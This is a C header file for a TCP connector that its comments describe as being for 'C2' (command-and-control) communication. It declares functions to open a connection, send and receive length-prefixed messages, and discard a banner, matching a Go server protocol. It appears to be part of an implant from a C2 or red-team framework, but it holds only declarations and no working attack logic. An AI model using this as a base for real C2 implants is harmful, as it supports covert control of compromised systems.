#ifndef CONNECTOR_H
#define CONNECTOR_H

#include <stdint.h>
#include <stddef.h>

/// TCP connector for C2 communication
/// Protocol: [4-byte BE length][payload]
/// Matches Go's functions.SendMsg/RecvMsg

typedef struct {
    int fd;
} connector_t;

// Connect to address "host:port" via TCP
// Returns 0 on success, -1 on failure
int conn_open(connector_t* c, const char* address);

// Close connection
void conn_close(connector_t* c);

// Read exactly `size` bytes
int conn_read_exact(connector_t* c, uint8_t* buf, size_t size);

// Receive a length-prefixed message
// Allocates buffer, sets *data and *len
// Caller must free *data with ax_free(*data, *len)
int conn_recv_msg(connector_t* c, uint8_t** data, size_t* len);

// Send a length-prefixed message
int conn_send_msg(connector_t* c, const uint8_t* data, size_t len);

// Read and discard `size` bytes (for banner)
int conn_discard(connector_t* c, size_t size);

#endif // CONNECTOR_H
